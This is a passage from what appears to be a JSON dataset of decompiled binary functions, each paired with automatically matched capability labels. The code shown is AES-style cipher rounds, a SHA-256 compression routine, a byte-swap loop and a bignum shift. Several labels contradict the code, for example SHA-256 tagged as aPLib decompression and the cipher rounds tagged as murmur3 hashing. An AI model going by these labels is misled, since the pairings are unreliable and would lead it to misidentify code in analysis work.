*((uVar4 >> 0x18) * 4 + 0x41d180) ^ *((uVar9 & 0xff) * 4 + 0x41c580) ^ puVar1[2];\n    uVar2 = *((uVar9 >> 8 & 0xff) * 4 + 0x41c980) ^ *((uVar2 >> 0x10 & 0xff) * 4 + 0x41cd80) ^\n            *((uVar8 >> 0x18) * 4 + 0x41d180) ^ *((uVar4 & 0xff) * 4 + 0x41c580) ^ puVar1[3];\n    uVar9 = CONCAT31(CONCAT21(CONCAT11(*((uVar6 >> 0x18) + 0x41c480), *((uVar7 >> 0x10 & 0xff) + 0x41c480)), \n                              *((uVar2 >> 8 & 0xff) + 0x41c480)), *((uVar5 & 0xff) + 0x41c480)) ^ puVar1[4];\n    uVar8 = CONCAT31(CONCAT21(CONCAT11(*((uVar7 >> 0x18) + 0x41c480), *((uVar2 >> 0x10 & 0xff) + 0x41c480)), \n                              *((uVar5 >> 8 & 0xff) + 0x41c480)), *((uVar6 & 0xff) + 0x41c480)) ^ puVar1[5];\n    uVar4 = CONCAT31(CONCAT21(CONCAT11(*((uVar2 >> 0x18) + 0x41c480), *((uVar5 >> 0x10 & 0xff) + 0x41c480)), \n                              *((uVar6 >> 8 & 0xff) + 0x41c480)), *((uVar7 & 0xff) + 0x41c480)) ^ puVar1[6];\n    uVar2 = CONCAT31(CONCAT21(CONCAT11(*((uVar5 >> 0x18) + 0x41c480), *((uVar6 >> 0x10 & 0xff) + 0x41c480)), \n                              *((uVar7 >> 8 & 0xff) + 0x41c480)), *((uVar2 & 0xff) + 0x41c480)) ^ puVar1[7];\n    *arg_10h = uVar9;\n    arg_10h[1] = uVar9 >> 8;\n    arg_10h[2] = uVar9 >> 0x10;\n    arg_10h[3] = uVar9 >> 0x18;\n    arg_10h[4] = uVar8;\n    arg_10h[5] = uVar8 >> 8;\n    arg_10h[6] = uVar8 >> 0x10;\n    arg_10h[7] = uVar8 >> 0x18;\n    arg_10h[9] = uVar4 >> 8;\n    arg_10h[10] = uVar4 >> 0x10;\n    arg_10h[0xd] = uVar2 >> 8;\n    arg_10h[8] = uVar4;\n    arg_10h[0xc] = uVar2;\n    arg_10h[0xb] = uVar4 >> 0x18;\n    arg_10h[0xe] = uVar2 >> 0x10;\n    arg_10h[0xf] = uVar2 >> 0x18;\n    return 0;\n}\n",
        "token_count": 2211
    },
    "00409530": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409530(int32_t *arg_8h, uint32_t *arg_ch, uchar *arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h[1];\n    uVar2 = arg_ch[1] ^ puVar1[1];\n    uVar3 = arg_ch[2] ^ puVar1[2];\n    uVar9 = *arg_ch ^ *puVar1;\n    uVar5 = arg_ch[3] ^ puVar1[3];\n    puVar1 = puVar1 + 4;\n    iVar4 = *arg_8h >> 1;\n    while (iVar4 = iVar4 + -1,  0 < iVar4) {\n        uVar6 = *((uVar3 >> 0x10 & 0xff) * 4 + 0x41bc80) ^ *((uVar2 >> 8 & 0xff) * 4 + 0x41b880) ^\n                *((uVar5 >> 0x18) * 4 + 0x41c080) ^ *((uVar9 & 0xff) * 4 + 0x41b480) ^ *puVar1;\n        uVar7 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x41bc80) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x41b880) ^\n                *((uVar9 >> 0x18) * 4 + 0x41c080) ^ *((uVar2 & 0xff) * 4 + 0x41b480) ^ puVar1[1];\n        uVar8 = *((uVar5 >> 8 & 0xff) * 4 + 0x41b880) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x41bc80) ^\n                *((uVar2 >> 0x18) * 4 + 0x41c080) ^ *((uVar3 & 0xff) * 4 + 0x41b480) ^ puVar1[2];\n        uVar5 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x41bc80) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x41b880) ^\n                *((uVar3 >> 0x18) * 4 + 0x41c080) ^ *((uVar5 & 0xff) * 4 + 0x41b480) ^ puVar1[3];\n        uVar9 = *((uVar8 >> 0x10 & 0xff) * 4 + 0x41bc80) ^ *((uVar7 >> 8 & 0xff) * 4 + 0x41b880) ^\n                *((uVar5 >> 0x18) * 4 + 0x41c080) ^ *((uVar6 & 0xff) * 4 + 0x41b480) ^ puVar1[4];\n        uVar2 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x41bc80) ^ *((uVar8 >> 8 & 0xff) * 4 + 0x41b880) ^\n                *((uVar6 >> 0x18) * 4 + 0x41c080) ^ *((uVar7 & 0xff) * 4 + 0x41b480) ^ puVar1[5];\n        uVar3 = *((uVar5 >> 8 & 0xff) * 4 + 0x41b880) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x41bc80) ^\n                *((uVar7 >> 0x18) * 4 + 0x41c080) ^ *((uVar8 & 0xff) * 4 + 0x41b480) ^ puVar1[6];\n        uVar5 = *((uVar7 >> 0x10 & 0xff) * 4 + 0x41bc80) ^ *((uVar6 >> 8 & 0xff) * 4 + 0x41b880) ^\n                *((uVar8 >> 0x18) * 4 + 0x41c080) ^ *((uVar5 & 0xff) * 4 + 0x41b480) ^ puVar1[7];\n        puVar1 = puVar1 + 8;\n    }\n    uVar6 = *((uVar3 >> 0x10 & 0xff) * 4 + 0x41bc80) ^ *((uVar2 >> 8 & 0xff) * 4 + 0x41b880) ^\n            *((uVar5 >> 0x18) * 4 + 0x41c080) ^ *((uVar9 & 0xff) * 4 + 0x41b480) ^ *puVar1;\n    uVar7 = *((uVar5 >> 0x10 & 0xff) * 4 + 0x41bc80) ^ *((uVar3 >> 8 & 0xff) * 4 + 0x41b880) ^\n            *((uVar9 >> 0x18) * 4 + 0x41c080) ^ *((uVar2 & 0xff) * 4 + 0x41b480) ^ puVar1[1];\n    uVar8 = *((uVar5 >> 8 & 0xff) * 4 + 0x41b880) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x41bc80) ^\n            *((uVar2 >> 0x18) * 4 + 0x41c080) ^ *((uVar3 & 0xff) * 4 + 0x41b480) ^ puVar1[2];\n    uVar2 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x41bc80) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x41b880) ^\n            *((uVar3 >> 0x18) * 4 + 0x41c080) ^ *((uVar5 & 0xff) * 4 + 0x41b480) ^ puVar1[3];\n    uVar9 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar2 >> 0x18], str.cw[uVar8 >> 0x10 & 0xff]), str.cw[uVar7 >> 8 & 0xff])\n                     , str.cw[uVar6 & 0xff]) ^ puVar1[4];\n    uVar3 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar6 >> 0x18], str.cw[uVar2 >> 0x10 & 0xff]), str.cw[uVar8 >> 8 & 0xff])\n                     , str.cw[uVar7 & 0xff]) ^ puVar1[5];\n    uVar5 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar7 >> 0x18], str.cw[uVar6 >> 0x10 & 0xff]), str.cw[uVar2 >> 8 & 0xff])\n                     , str.cw[uVar8 & 0xff]) ^ puVar1[6];\n    uVar2 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar8 >> 0x18], str.cw[uVar7 >> 0x10 & 0xff]), str.cw[uVar6 >> 8 & 0xff])\n                     , str.cw[uVar2 & 0xff]) ^ puVar1[7];\n    *arg_10h = uVar9;\n    arg_10h[1] = uVar9 >> 8;\n    arg_10h[2] = uVar9 >> 0x10;\n    arg_10h[3] = uVar9 >> 0x18;\n    arg_10h[4] = uVar3;\n    arg_10h[5] = uVar3 >> 8;\n    arg_10h[6] = uVar3 >> 0x10;\n    arg_10h[7] = uVar3 >> 0x18;\n    arg_10h[9] = uVar5 >> 8;\n    arg_10h[10] = uVar5 >> 0x10;\n    arg_10h[0xd] = uVar2 >> 8;\n    arg_10h[8] = uVar5;\n    arg_10h[0xc] = uVar2;\n    arg_10h[0xb] = uVar5 >> 0x18;\n    arg_10h[0xe] = uVar2 >> 0x10;\n    arg_10h[0xf] = uVar2 >> 0x18;\n    return 0;\n}\n",
        "token_count": 2110
    },
    "0040e030": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_140h\n// WARNING: Variable defined which should be unmapped: var_144h\n\nuint __cdecl fcn.0040e030(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    int32_t iStack380;\n    uint var_174h;\n    uint32_t uStack372;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    int32_t aiStack344 [2];\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    int32_t aiStack272 [53];\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t *var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_20h = *(arg_8h + 0x18);\n    var_38h = *(arg_8h + 8);\n    var_24h = *(arg_8h + 0xc);\n    var_14h = *(arg_8h + 0x10);\n    var_10h = *(arg_8h + 0x14);\n    var_1ch = *(arg_8h + 8);\n    uVar5 = 0;\n    var_8h = *(arg_8h + 0x20);\n    var_ch = *(arg_8h + 0x1c);\n    var_18h = *(arg_8h + 0x24);\n    puVar7 = arg_ch + 2;\n    do {\n        (&var_138h)[uVar5] = CONCAT31(CONCAT21(CONCAT11(puVar7[-2], puVar7[-1]), *puVar7), puVar7[1]);\n        uVar5 = uVar5 + 1;\n        puVar7 = puVar7 + 4;\n    } while (uVar5 < 0x10);\n    uVar5 = 0;\n    do {\n        iVar8 = ((var_20h >> 0xb | var_20h << 0x15) ^ (var_20h << 7 | var_20h >> 0x19) ^\n                (var_20h >> 6 | var_20h << 0x1a)) + ((var_ch ^ var_8h) & var_20h ^ var_8h) + *(uVar5 + 0x41d820) +\n                *(&var_138h + uVar5) + var_18h;\n        var_18h = var_10h + iVar8;\n        uVar6 = (var_1ch & var_24h | (var_24h | var_1ch) & var_14h) +\n                ((var_1ch >> 0xd | var_1ch << 0x13) ^ (var_1ch << 10 | var_1ch >> 0x16) ^\n                (var_1ch >> 2 | var_1ch << 0x1e)) + iVar8;\n        iVar8 = ((var_18h >> 0xb | var_18h * 0x200000) ^ (var_18h * 0x80 | var_18h >> 0x19) ^\n                (var_18h >> 6 | var_18h * 0x4000000)) + ((var_ch ^ var_20h) & var_18h ^ var_ch) + *(uVar5 + 0x41d824) +\n                *(&var_134h + uVar5) + var_8h;\n        var_4h = var_14h + iVar8;\n        var_8h = (var_1ch & uVar6 | (var_1ch | uVar6) & var_24h) +\n                 ((uVar6 >> 0xd | uVar6 * 0x80000) ^ (uVar6 * 0x400 | uVar6 >> 0x16) ^ (uVar6 >> 2 | uVar6 * 0x40000000)\n                 ) + iVar8;\n        iVar8 = ((var_4h >> 0xb | var_4h * 0x200000) ^ (var_4h * 0x80 | var_4h >> 0x19) ^\n                (var_4h >> 6 | var_4h * 0x4000000)) + ((var_18h ^ var_20h) & var_4h ^ var_20h) + *(uVar5 + 0x41d828) +\n                *(&var_130h + uVar5) + var_ch;\n        var_28h = var_24h + iVar8;\n        var_ch = (var_8h & uVar6 | (var_8h | uVar6) & var_1ch) +\n                 ((var_8h >> 0xd | var_8h * 0x80000) ^ (var_8h * 0x400 | var_8h >> 0x16) ^\n                 (var_8h >> 2 | var_8h * 0x40000000)) + iVar8;\n        iVar8 = ((var_28h >> 0xb | var_28h * 0x200000) ^ (var_28h * 0x80 | var_28h >> 0x19) ^\n                (var_28h >> 6 | var_28h * 0x4000000)) + ((var_18h ^ var_4h) & var_28h ^ var_18h) + *(uVar5 + 0x41d82c) +\n                *(&var_12ch + uVar5) + var_20h;\n        var_1ch = var_1ch + iVar8;\n        var_20h = (var_ch & var_8h | (var_ch | var_8h) & uVar6) +\n                  ((var_ch >> 0xd | var_ch * 0x80000) ^ (var_ch * 0x400 | var_ch >> 0x16) ^\n                  (var_ch >> 2 | var_ch * 0x40000000)) + iVar8;\n        iVar8 = ((var_1ch >> 0xb | var_1ch * 0x200000) ^ (var_1ch * 0x80 | var_1ch >> 0x19) ^\n                (var_1ch >> 6 | var_1ch * 0x4000000)) + ((var_28h ^ var_4h) & var_1ch ^ var_4h) + *(uVar5 + 0x41d830) +\n                *(&var_128h + uVar5) + var_18h;\n        var_18h = uVar6 + iVar8;\n        var_10h = ((var_20h | var_ch) & var_8h | var_20h & var_ch) +\n                  ((var_20h >> 0xd | var_20h * 0x80000) ^ (var_20h * 0x400 | var_20h >> 0x16) ^\n                  (var_20h >> 2 | var_20h * 0x40000000)) + iVar8;\n        iVar8 = ((var_18h >> 0xb | var_18h * 0x200000) ^ (var_18h * 0x80 | var_18h >> 0x19) ^\n                (var_18h >> 6 | var_18h * 0x4000000)) + ((var_28h ^ var_1ch) & var_18h ^ var_28h) + *(uVar5 + 0x41d834)\n                + *(&var_124h + uVar5) + var_4h;\n        var_8h = var_8h + iVar8;\n        var_14h = ((var_10h | var_20h) & var_ch | var_10h & var_20h) +\n                  ((var_10h >> 0xd | var_10h * 0x80000) ^ (var_10h * 0x400 | var_10h >> 0x16) ^\n                  (var_10h >> 2 | var_10h * 0x40000000)) + iVar8;\n        iVar8 = ((var_8h >> 0xb | var_8h * 0x200000) ^ (var_8h * 0x80 | var_8h >> 0x19) ^\n                (var_8h >> 6 | var_8h * 0x4000000)) + ((var_1ch ^ var_18h) & var_8h ^ var_1ch) + *(uVar5 + 0x41d838) +\n                *(&var_120h + uVar5) + var_28h;\n        var_ch = var_ch + iVar8;\n        var_24h = ((var_14h | var_10h) & var_20h | var_14h & var_10h) +\n                  ((var_14h >> 0xd | var_14h * 0x80000) ^ (var_14h * 0x400 | var_14h >> 0x16) ^\n                  (var_14h >> 2 | var_14h * 0x40000000)) + iVar8;\n        piVar1 = uVar5 + 0x41d83c;\n        piVar2 = &var_11ch + uVar5;\n        uVar5 = uVar5 + 0x20;\n        iVar8 = ((var_ch >> 0xb | var_ch * 0x200000) ^ (var_ch * 0x80 | var_ch >> 0x19) ^\n                (var_ch >> 6 | var_ch * 0x4000000)) + ((var_18h ^ var_8h) & var_ch ^ var_18h) + *piVar1 + *piVar2 +\n                var_1ch;\n        var_20h = var_20h + iVar8;\n        var_1ch = ((var_14h | var_24h) & var_10h | var_14h & var_24h) +\n                  ((var_24h >> 0xd | var_24h * 0x80000) ^ (var_24h * 0x400 | var_24h >> 0x16) ^\n                  (var_24h >> 2 | var_24h * 0x40000000)) + iVar8;\n    } while (uVar5 < 0x40);\n    var_4h = 0x40;\n    do {\n        uVar4 = var_4h;\n        uVar3 = var_20h;\n        uVar5 = *(&uStack372 + (var_4h - 4));\n        uVar6 = *(&var_140h + var_4h);\n        var_28h = &var_140h + var_4h;\n        var_34h = ((uVar6 << 0xf | uVar6 >> 0x11) ^ (uVar6 << 0xd | uVar6 >> 0x13) ^ uVar6 >> 10) +\n                  ((uVar5 << 0xe | uVar5 >> 0x12) ^ (uVar5 >> 7 | uVar5 << 0x19) ^ uVar5 >> 3) + *(&iStack380 + var_4h)\n                  + *(aiStack344 + var_4h);\n        *(&var_138h + var_4h) = var_34h;\n        var_2ch = *(&uStack372 + uVar4);\n        iVar8 = ((uVar3 >> 0xb | uVar3 << 0x15) ^ (uVar3 << 7 | uVar3 >> 0x19) ^ (uVar3 >> 6 | uVar3 << 0x1a)) +\n                ((var_ch ^ var_8h) & uVar3 ^ var_8h) + *(var_4h + 0x41d820) + var_34h + var_18h;\n        uVar6 = var_10h + iVar8;\n        var_10h = uVar6;\n        uVar4 = (var_24h & var_1ch | (var_24h | var_1ch) & var_14h) +\n                ((var_1ch >> 0xd | var_1ch << 0x13) ^ (var_1ch << 10 | var_1ch >> 0x16) ^\n                (var_1ch >> 2 | var_1ch << 0x1e)) + iVar8;\n        var_18h = uVar4;\n        uVar3 = var_28h[1];\n        uVar5 = uVar5 + ((uVar3 << 0xf | uVar3 >> 0x11) ^ (uVar3 << 0xd | uVar3 >> 0x13) ^ uVar3 >> 10) +\n                        ((var_2ch << 0xe | var_2ch >> 0x12) ^ (var_2ch >> 7 | var_2ch << 0x19) ^ var_2ch >> 3) +\n                        var_28h[-4];\n        *(&var_134h + var_4h) = uVar5;\n        iVar8 = ((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 * 0x80 | uVar6 >> 0x19) ^ (uVar6 >> 6 | uVar6 * 0x4000000))\n                + ((var_ch ^ var_20h) & uVar6 ^ var_ch) + *(var_4h + 0x41d824) + uVar5 + var_8h;\n        uVar6 = var_14h + iVar8;\n        var_14h = uVar6;\n        var_8h = (var_18h & var_1ch | (uVar4 | var_1ch) & var_24h) +\n                 ((uVar4 >> 0xd | uVar4 * 0x80000) ^ (uVar4 * 0x400 | uVar4 >> 0x16) ^ (uVar4 >> 2 | uVar4 * 0x40000000)\n                 ) + iVar8;\n        var_30h = *(&var_16ch + var_4h);\n        var_2ch = ((var_30h << 0xe | var_30h >> 0x12) ^ (var_30h >> 7 | var_30h << 0x19) ^ var_30h >> 3) +\n                  ((var_34h << 0xf | var_34h >> 0x11) ^ (var_34h << 0xd | var_34h >> 0x13) ^ var_34h >> 10) +\n                  *(&var_14ch + var_4h) + var_2ch;\n        *(&var_130h + var_4h) = var_2ch;\n        iVar8 = ((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 * 0x80 | uVar6 >> 0x19) ^ (uVar6 >> 6 | uVar6 * 0x4000000))\n                + ((var_10h ^ var_20h) & uVar6 ^ var_20h) + *(var_4h + 0x41d828) + var_2ch + var_ch;\n        uVar6 = var_24h + iVar8;\n        var_24h = uVar6;\n        uVar4 = ((var_8h | var_18h) & var_1ch | var_8h & var_18h) +\n                ((var_8h >> 0xd | var_8h << 0x13) ^ (var_8h << 10 | var_8h >> 0x16) ^ (var_8h >> 2 | var_8h << 0x1e)) +\n                iVar8;\n        var_ch = uVar4;\n        uVar3 = *(&var_168h + var_4h);\n        var_30h = ((uVar3 << 0xe | uVar3 >> 0x12) ^ (uVar3 >> 7 | uVar3 << 0x19) ^ uVar3 >> 3) +\n                  ((uVar5 * 0x8000 | uVar5 >> 0x11) ^ (uVar5 * 0x2000 | uVar5 >> 0x13) ^ uVar5 >> 10) +\n                  *(&var_148h + var_4h) + var_30h;\n        *(&var_12ch + var_4h) = var_30h;\n        iVar8 = ((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 * 0x80 | uVar6 >> 0x19) ^ (uVar6 >> 6 | uVar6 * 0x4000000))\n                + ((var_14h ^ var_10h) & uVar6 ^ var_10h) + *(var_4h + 0x41d82c) + var_30h + var_20h;\n        uVar5 = var_1ch + iVar8;\n        var_1ch = uVar5;\n        uVar4 = ((uVar4 | var_8h) & var_18h | uVar4 & var_8h) +\n                ((uVar4 >> 0xd | uVar4 * 0x80000) ^ (uVar4 * 0x400 | uVar4 >> 0x16) ^ (uVar4 >> 2 | uVar4 * 0x40000000))\n                + iVar8;\n        var_20h = uVar4;\n        uVar6 = *(&var_164h + var_4h);\n        var_2ch = ((var_2ch << 0xf | var_2ch >> 0x11) ^ (var_2ch << 0xd | var_2ch >> 0x13) ^ var_2ch >> 10) +\n                  ((uVar6 << 0xe | uVar6 >> 0x12) ^ (uVar6 >> 7 | uVar6 << 0x19) ^ uVar6 >> 3) + *(&var_144h + var_4h) +\n                  uVar3;\n        *(&var_128h + var_4h) = var_2ch;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_14h ^ var_24h) & uVar5 ^ var_14h) + *(var_4h + 0x41d830) + var_2ch + var_10h;\n        uVar5 = var_18h + iVar8;\n        var_18h = uVar5;\n        var_10h = (var_ch & uVar4 | (var_ch | uVar4) & var_8h) +\n                  ((uVar4 >> 0xd | uVar4 * 0x80000) ^ (uVar4 * 0x400 | uVar4 >> 0x16) ^\n                  (uVar4 >> 2 | uVar4 * 0x40000000)) + iVar8;\n        uVar3 = *(&var_160h + var_4h);\n        var_30h = ((var_30h << 0xf | var_30h >> 0x11) ^ (var_30h << 0xd | var_30h >> 0x13) ^ var_30h >> 10) +\n                  ((uVar3 << 0xe | uVar3 >> 0x12) ^ (uVar3 >> 7 | uVar3 << 0x19) ^ uVar3 >> 3) + *(&var_140h + var_4h) +\n                  uVar6;\n        *(&var_124h + var_4h) = var_30h;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_24h ^ var_1ch) & uVar5 ^ var_24h) + *(var_4h + 0x41d834) + var_30h + var_14h;\n        uVar5 = var_8h + iVar8;\n        var_8h = uVar5;\n        var_14h = (var_10h & var_20h | (var_10h | var_20h) & var_ch) +\n                  ((var_10h >> 0xd | var_10h << 0x13) ^ (var_10h << 10 | var_10h >> 0x16) ^\n                  (var_10h >> 2 | var_10h << 0x1e)) + iVar8;\n        uVar6 = var_28h[-7];\n        iVar8 = ((uVar6 << 0xe | uVar6 >> 0x12) ^ (uVar6 >> 7 | uVar6 << 0x19) ^ uVar6 >> 3) +\n                ((var_2ch << 0xf | var_2ch >> 0x11) ^ (var_2ch << 0xd | var_2ch >> 0x13) ^ var_2ch >> 10) + uVar3 +\n                var_28h[1];\n        *(&var_120h + var_4h) = iVar8;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_1ch ^ var_18h) & uVar5 ^ var_1ch) + *(var_4h + 0x41d838) + iVar8 + var_24h;\n        uVar5 = var_ch + iVar8;\n        var_ch = uVar5;\n        var_24h = (var_14h & var_10h | (var_14h | var_10h) & var_20h) +\n                  ((var_14h >> 0xd | var_14h << 0x13) ^ (var_14h << 10 | var_14h >> 0x16) ^\n                  (var_14h >> 2 | var_14h << 0x1e)) + iVar8;\n        uVar3 = var_28h[-6];\n        iVar8 = ((uVar3 << 0xe | uVar3 >> 0x12) ^ (uVar3 >> 7 | uVar3 << 0x19) ^ uVar3 >> 3) +\n                ((var_30h << 0xf | var_30h >> 0x11) ^ (var_30h << 0xd | var_30h >> 0x13) ^ var_30h >> 10) + var_34h +\n                uVar6;\n        *(&var_11ch + var_4h) = iVar8;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_18h ^ var_8h) & uVar5 ^ var_18h) + *(var_4h + 0x41d83c) + iVar8 + var_1ch;\n        var_20h = var_20h + iVar8;\n        var_1ch = (var_14h & var_24h | (var_14h | var_24h) & var_10h) +\n                  ((var_24h >> 0xd | var_24h << 0x13) ^ (var_24h << 10 | var_24h >> 0x16) ^\n                  (var_24h >> 2 | var_24h << 0x1e)) + iVar8;\n        var_4h = var_4h + 0x20;\n    } while (var_4h < 0x100);\n    *(arg_8h + 8) = var_1ch + var_38h;\n    *(arg_8h + 0x10) = *(arg_8h + 0x10) + var_14h;\n    *(arg_8h + 0x14) = *(arg_8h + 0x14) + var_10h;\n    *(arg_8h + 0x1c) = *(arg_8h + 0x1c) + var_ch;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + var_24h;\n    *(arg_8h + 0x20) = *(arg_8h + 0x20) + var_8h;\n    *(arg_8h + 0x18) = *(arg_8h + 0x18) + var_20h;\n    *(arg_8h + 0x24) = *(arg_8h + 0x24) + var_18h;\n    return 0;\n}\n",
        "token_count": 6032
    },
    "0040c6a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c6a0(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    if ((arg_ch != NULL) && (arg_ch = arg_8h + arg_ch + -1,  arg_8h <= arg_ch)) {\n        do {\n            uVar5 = *arg_8h;\n            uVar7 = 0;\n            cVar1 = '\\0';\n            iVar6 = 4;\n            do {\n                iVar8 = iVar6;\n                uVar4 = uVar5 & 0xff;\n                uVar3 = 0x18 - cVar1;\n                uVar5 = uVar5 >> 8;\n                cVar1 = cVar1 + '\\b';\n                uVar7 = uVar7 | uVar4 << (uVar3 & 0x1f);\n                iVar6 = iVar8 + -1;\n            } while (iVar6 != 0);\n            uVar4 = 0;\n            iVar8 = iVar8 + 3;\n            uVar5 = *arg_ch;\n            do {\n                uVar2 = uVar5 & 0xff;\n                cVar1 = iVar6;\n                uVar5 = uVar5 >> 8;\n                iVar6 = iVar6 + 8;\n                uVar4 = uVar4 | uVar2 << (0x18U - cVar1 & 0x1f);\n                iVar8 = iVar8 + -1;\n            } while (iVar8 != 0);\n            *arg_8h = uVar4;\n            arg_8h = arg_8h + 1;\n            *arg_ch = uVar7;\n            arg_ch = arg_ch + -1;\n        } while (arg_8h <= arg_ch);\n    }\n    return;\n}\n",
        "token_count": 458
    },
    "0040c1f0": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c1f0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    int8_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    uVar6 = arg_ch >> 5;\n    iVar3 = fcn.00409d40(arg_8h);\n    uVar4 = iVar3 + arg_ch;\n    uVar5 = *(arg_8h + 4);\n    if (uVar5 << 5 < uVar4) {\n        uVar4 = ((uVar4 & 0x1f) != 0) + (uVar4 >> 5);\n        if (10000 < uVar4) {\n            return 0xfffffff0;\n        }\n        if (uVar5 < uVar4) {\n            iVar3 = sub.msvcrt.dll_calloc(uVar4, 4);\n            if (iVar3 == 0) {\n                return 0xfffffff0;\n            }\n            if (*(arg_8h + 8) != 0) {\n                fcn.004124d0(iVar3, *(arg_8h + 8), *(arg_8h + 4) << 2);\n                fcn.0040eda0(*(arg_8h + 8), *(arg_8h + 4) << 2);\n                sub.msvcrt.dll_free(*(arg_8h + 8));\n            }\n            *(arg_8h + 4) = uVar4;\n            *(arg_8h + 8) = iVar3;\n            uVar5 = uVar4;\n        }\n    }\n    if (uVar6 != 0) {\n        if (uVar6 < uVar5) {\n            iVar3 = (uVar5 - uVar6) * 4;\n            do {\n                iVar3 = iVar3 + -4;\n                *(*(arg_8h + 8) + -4 + uVar5 * 4) = *(iVar3 + *(arg_8h + 8));\n                uVar5 = uVar5 - 1;\n            } while (uVar6 < uVar5);\n        }\n        for (; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *(*(arg_8h + 8) + -4 + uVar5 * 4) = 0;\n        }\n    }\n    if (((arg_ch & 0x1f) != 0) && (uVar6 < *(arg_8h + 4))) {\n        iVar2 = arg_ch & 0x1f;\n        do {\n            uVar5 = *(*(arg_8h + 8) + uVar6 * 4);\n            *(*(arg_8h + 8) + uVar6 * 4) = uVar5 << iVar2;\n            puVar1 = *(arg_8h + 8) + uVar6 * 4;\n            *puVar1 = *puVar1 | var_4h;\n            uVar6 = uVar6 + 1;\n            var_4h = uVar5 >> (0x20U - iVar2 & 0x1f);\n        } while (uVar6 < *(arg_8h + 4));\n    }\n    return 0;\n}\n",
        "token_count": 766
    },
    "0040c330": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
